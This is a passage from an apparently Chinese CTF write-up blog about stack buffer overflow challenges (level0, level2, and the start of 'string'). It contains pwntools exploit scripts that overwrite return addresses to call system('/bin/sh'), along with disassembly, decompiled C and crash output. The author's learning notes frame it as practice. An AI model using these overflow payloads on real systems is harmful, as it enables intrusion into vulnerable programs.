</span></span><span class=line><span class=cl><span class=nv>payload</span><span class=o>+=</span>l64<span class=o>(</span>0x00400684<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span><span class=o>+=</span>l64<span class=o>(</span>0x000000000040059f<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>io</span><span class=o>=</span>zio<span class=o>(</span><span class=s1>&#39;./level0&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>io.writeline<span class=o>(</span>payload<span class=o>)</span>
</span></span><span class=line><span class=cl>io.read<span class=o>()</span>~~
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s2>&#34;./level0&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = remote(&#34;111.198.29.45&#34;,53314)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> b<span class=s1>&#39;a&#39;</span> * <span class=m>136</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>0x0000000000400663<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>0x00400684<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span>p64<span class=o>(</span>0x000000000040059f<span class=o>)</span>
</span></span><span class=line><span class=cl>p.sendlineafter<span class=o>(</span><span class=s2>&#34;Hello, World\n&#34;</span>,payload<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p.interactive<span class=o>()</span>
</span></span></code></pre></div><p>PS:下面的脚本是对的，上面是错的，弄了一晚上原因是因为对于ZIO和Pwntool这两个库没有深入了解，只是依样画葫芦的用而已</p><p>若是将上面的system地址修改为plt地址，则会因为堆栈不平衡而报错,PS:如何修复堆栈还不太会</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ python3 3.py 
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./level0&#39;</span>: pid <span class=m>40509</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</span></span><span class=line><span class=cl>$ whoami
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Process <span class=s1>&#39;./level0&#39;</span> stopped with <span class=nb>exit</span> code -11 <span class=o>(</span>SIGSEGV<span class=o>)</span> <span class=o>(</span>pid 40509<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> sending in interactive
</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/home/vincebye/.local/lib/python3.6/site-packages/pwnlib/tubes/process.py&#34;</span>, line 777, in close
</span></span><span class=line><span class=cl>    fd.close<span class=o>()</span>
</span></span><span class=line><span class=cl>BrokenPipeError: <span class=o>[</span>Errno 32<span class=o>]</span> Broken pipe
</span></span></code></pre></div><h1 id=level2>Level2</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> DATA XREF from entry0 @ 0x8048367
</span></span><span class=line><span class=cl>┌ 51: int main <span class=o>(</span>int32_t arg_4h<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>│           <span class=p>;</span> var int32_t var_4h @ ebp-0x4
</span></span><span class=line><span class=cl>│           <span class=p>;</span> arg int32_t arg_4h @ esp+0x24
</span></span><span class=line><span class=cl>│           0x08048480      8d4c2404       lea ecx, <span class=o>[</span>arg_4h<span class=o>]</span>
</span></span><span class=line><span class=cl>│           0x08048484      83e4f0         and esp, 0xfffffff0
</span></span><span class=line><span class=cl>│           0x08048487      ff71fc         push dword <span class=o>[</span>ecx - 4<span class=o>]</span>
</span></span><span class=line><span class=cl>│           0x0804848a      <span class=m>55</span>             push ebp
</span></span><span class=line><span class=cl>│           0x0804848b      89e5           mov ebp, esp
</span></span><span class=line><span class=cl>│           0x0804848d      <span class=m>51</span>             push ecx
</span></span><span class=line><span class=cl>│           0x0804848e      83ec04         sub esp, <span class=m>4</span>
</span></span><span class=line><span class=cl>│           0x08048491      e8b5ffffff     call sym.vulnerable_function
</span></span><span class=line><span class=cl>│           0x08048496      83ec0c         sub esp, 0xc
</span></span><span class=line><span class=cl>│           0x08048499      684c850408     push str.echo__Hello_World  <span class=p>;</span> 0x804854c <span class=p>;</span> <span class=s2>&#34;echo &#39;Hello World!&#39;&#34;</span> <span class=p>;</span> const char *string
</span></span><span class=line><span class=cl>│           0x0804849e      e87dfeffff     call sym.imp.system         <span class=p>;</span> int system<span class=o>(</span>const char *string<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x080484a3      83c410         add esp, 0x10
</span></span><span class=line><span class=cl>│           0x080484a6      b800000000     mov eax, <span class=m>0</span>
</span></span><span class=line><span class=cl>│           0x080484ab      8b4dfc         mov ecx, dword <span class=o>[</span>var_4h<span class=o>]</span>
</span></span><span class=line><span class=cl>│           0x080484ae      c9             leave
</span></span><span class=line><span class=cl>│           0x080484af      8d61fc         lea esp, <span class=o>[</span>ecx - 4<span class=o>]</span>
</span></span><span class=line><span class=cl>└           0x080484b2      c3             ret
</span></span><span class=line><span class=cl><span class=o>[</span>0x08048480<span class=o>]</span>&gt; s sym.vulnerable_function
</span></span><span class=line><span class=cl><span class=o>[</span>0x0804844b<span class=o>]</span>&gt; pdf
</span></span><span class=line><span class=cl>            <span class=p>;</span> CALL XREF from main @ 0x8048491
</span></span><span class=line><span class=cl>┌ 53: sym.vulnerable_function <span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>│           <span class=p>;</span> var void *buf @ ebp-0x88
</span></span><span class=line><span class=cl>│           0x0804844b      <span class=m>55</span>             push ebp
</span></span><span class=line><span class=cl>│           0x0804844c      89e5           mov ebp, esp
</span></span><span class=line><span class=cl>│           0x0804844e      81ec88000000   sub esp, 0x88
</span></span><span class=line><span class=cl>│           0x08048454      83ec0c         sub esp, 0xc
</span></span><span class=line><span class=cl>│           0x08048457      <span class=m>6840850408</span>     push str.echo_Input:        <span class=p>;</span> 0x8048540 <span class=p>;</span> <span class=s2>&#34;echo Input:&#34;</span> <span class=p>;</span> const char *string
</span></span><span class=line><span class=cl>│           0x0804845c      e8bffeffff     call sym.imp.system         <span class=p>;</span> int system<span class=o>(</span>const char *string<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x08048461      83c410         add esp, 0x10
</span></span><span class=line><span class=cl>│           0x08048464      83ec04         sub esp, <span class=m>4</span>
</span></span><span class=line><span class=cl>│           0x08048467      <span class=m>6800010000</span>     push 0x100                  <span class=p>;</span> <span class=m>256</span> <span class=p>;</span> size_t nbyte
</span></span><span class=line><span class=cl>│           0x0804846c      8d8578ffffff   lea eax, <span class=o>[</span>buf<span class=o>]</span>
</span></span><span class=line><span class=cl>│           0x08048472      <span class=m>50</span>             push eax                    <span class=p>;</span> void *buf
</span></span><span class=line><span class=cl>│           0x08048473      6a00           push <span class=m>0</span>                      <span class=p>;</span> int fildes
</span></span><span class=line><span class=cl>│           0x08048475      e896feffff     call sym.imp.read           <span class=p>;</span> ssize_t read<span class=o>(</span>int fildes, void *buf, size_t nbyte<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x0804847a      83c410         add esp, 0x10
</span></span><span class=line><span class=cl>│           0x0804847d      <span class=m>90</span>             nop
</span></span><span class=line><span class=cl>│           0x0804847e      c9             leave
</span></span><span class=line><span class=cl>└           0x0804847f      c3             ret
</span></span></code></pre></div><p>用GDB一运行就报错出去了，我不会这道题，虽然定级很简单,网上搜了一圈WP，基本都是用的IDA查看的源码，就没有用GDB调试，哎，总是逃避一个又一个错误，其实并没有真的解决</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0x08048320 system地址
</span></span><span class=line><span class=cl><span class=o>[</span>Strings<span class=o>]</span>
</span></span><span class=line><span class=cl>nth paddr      vaddr      len size section <span class=nb>type</span>  string
</span></span><span class=line><span class=cl>―――――――――――――――――――――――――――――――――――――――――――――――――――――――
</span></span><span class=line><span class=cl><span class=m>0</span>   0x00000540 0x08048540 <span class=m>11</span>  <span class=m>12</span>   .rodata ascii <span class=nb>echo</span> Input:
</span></span><span class=line><span class=cl><span class=m>1</span>   0x0000054c 0x0804854c <span class=m>19</span>  <span class=m>20</span>   .rodata ascii <span class=nb>echo</span> <span class=s1>&#39;Hello World!&#39;</span>
</span></span><span class=line><span class=cl><span class=m>0</span>   0x00001024 0x0804a024 <span class=m>7</span>   <span class=m>8</span>    .data   ascii /bin/sh
</span></span></code></pre></div><p>看vulnerable_function代码可见buf的大小为0x88+0x4(140),构造EXP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~~from pwn import *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s2>&#34;./level2&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = remote(&#34;111.198.29.45&#34;,53314)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> b<span class=s1>&#39;a&#39;</span> * <span class=m>148</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> b<span class=s1>&#39;b&#39;</span>*4
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p32<span class=o>(</span>0x08048320<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p32<span class=o>(</span>0x0804a024<span class=o>)</span>
</span></span><span class=line><span class=cl>p.sendlineafter<span class=o>(</span><span class=s2>&#34;Input:\n&#34;</span>,payload<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p.interactive<span class=o>()</span>~~
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl><span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s2>&#34;./level2&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = remote(&#34;111.198.29.45&#34;,53314)</span>
</span></span><span class=line><span class=cl><span class=nv>elf</span><span class=o>=</span>ELF<span class=o>(</span><span class=s2>&#34;level2&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>system_addr</span><span class=o>=</span>elf.plt<span class=o>[</span><span class=s1>&#39;system&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl><span class=c1>#system_addr=elf.got[&#39;system&#39;]</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span><span class=o>=</span>b<span class=s1>&#39;a&#39;</span>*140
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p32<span class=o>(</span>system_addr<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span>p32<span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p32<span class=o>(</span>0x0804a024<span class=o>)</span>
</span></span><span class=line><span class=cl>p.sendlineafter<span class=o>(</span><span class=s2>&#34;Input:\n&#34;</span>,payload<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p.interactive<span class=o>()</span>
</span></span></code></pre></div><p>sym.imp.system的地址并不是system函数的地址</p><h1 id=string>String</h1><p><del>依旧不会，放入IDA中F5失败了</del></p><p>main的函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a2</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// ST88_8@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// rax@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// ST18_8@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// rdx@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>alarm</span><span class=p>(</span><span class=mh>0x3Cu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sub_400996</span><span class=p>(</span><span class=mi>60LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v4</span> <span class=o>=</span> <span class=mi>68</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>85</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;we will tell you two secret ...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;secret[0] is %x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span><span class=p>,</span> <span class=n>a2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;secret[1] is %x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;do not tell anyone &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sub_400D72</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;The End.....Really?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>sub_400D72函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_400D72</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [sp+10h] [bp-20h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [sp+28h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;What should your character&#39;s name be:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>strlen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mh>0xC</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Creating a new player.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_400A7D</span><span class=p>(</span><span class=s>&#34;Creating a new player.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_400BB9</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_400CA6</span><span class=p>(</span><span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Hei! What&#39;s up!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>sub_400A7D函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_400A7D</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s1</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-10h]@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [sp+8h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34; This is a famous but quite unusual inn. The air is fresh and the&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;marble-tiled ground is clean. Few rowdy guests can be seen, and the&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;furniture looks undamaged by brawls, which are very common in other pubs&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;all around the world. The decoration looks extremely valuable and would fit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;into a palace, but in this city it&#39;s quite ordinary. In the middle of the&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;room are velvet covered chairs and benches, which surround large oaken&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;tables. A large sign is fixed to the northern wall behind a wooden bar. In&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;one corner you notice a fireplace.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;There are two obvious exits: east, up.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;But strange thing is ,no one there.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;So, where you will go?east or up?:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1</span><span class=p>,</span> <span class=s>&#34;east&#34;</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1</span><span class=p>,</span> <span class=s>&#34;east&#34;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;hei! I&#39;m secious!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;So, where you will go?:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1</span><span class=p>,</span> <span class=s>&#34;east&#34;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1</span><span class=p>,</span> <span class=s>&#34;up&#34;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nf>sub_4009DD</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1</span><span class=p>,</span> <span class=s>&#34;up&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;YOU KNOW WHAT YOU DO?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>sub_4009DD函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>__noreturn</span> <span class=nf>sub_4009DD</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// eax@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-10h]@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [sp+4h] [bp-Ch]@2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+8h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You go right, suddenly, a big hole appear front you!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;where you will go?!left(0) or right(1)?!:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>v0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=p>((((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>31</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>_BYTE</span><span class=p>)</span><span class=n>v1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>-</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>31</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>!=</span> <span class=n>v3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You escape it!but another hole appear!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;where you will go?!left(0) or right(1)?!:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;YOU ARE DEAD&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>sub_400BB9函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_400BB9</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [sp+4h] [bp-7Ch]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [sp+8h] [bp-78h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>format</span><span class=p>;</span> <span class=c1>// [sp+10h] [bp-70h]@2
